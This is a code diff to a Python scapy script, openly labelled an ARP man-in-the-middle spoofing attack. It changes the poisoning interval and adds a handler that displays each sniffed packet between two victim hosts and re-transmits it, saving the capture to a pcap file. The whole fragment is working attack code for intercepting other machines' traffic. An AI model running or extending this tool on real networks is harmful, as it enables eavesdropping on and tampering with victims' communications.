@@ -4,7 +4,7 @@ import sys, time, multiprocessing
 
 # Constants
 DIVIDER = '=' * 60
-POISON_BREAK = 2
+POISON_BREAK = 30
 STOP_MESSAGE = 'Press [CTRL-C] to\n1. Stop the ARP MITM Spoofing\n2. Save the sniffed packets to sniffedPackets.pcap\n3. Clean the ARP tables of the victims'
 
 # ARP Man in the Middle Spoofing Attack
@@ -76,10 +76,14 @@ class ARPMITMSpoofing():
 
     # Sniffs incoming packets
     def sniffIncomingPackets(self):
-        bpfFilter = 'ip host {} || ip host {}'.format(victimOneIP, victimTwoIP) 
-        incomingPackets = scapy.sniff(filter = bpfFilter, prn = lambda x: x.summary()) # Sniff packets until key interrupt
+        bpfFilter = 'ip host {} || ip host {} '.format(victimOneIP, victimTwoIP) 
+        incomingPackets = scapy.sniff(filter = bpfFilter, prn = self.processPacket) # Sniff packets until key interrupt
 
         scapy.wrpcap('sniffedPackets.pcap', incomingPackets) # Save sniffed packets
+
+    def processPacket(self, packet):
+        packet.show() # lambda x: x.summary()
+        scapy.sendp(packet)
 
     # Clean ARP tables of the victims
     def clean(self):
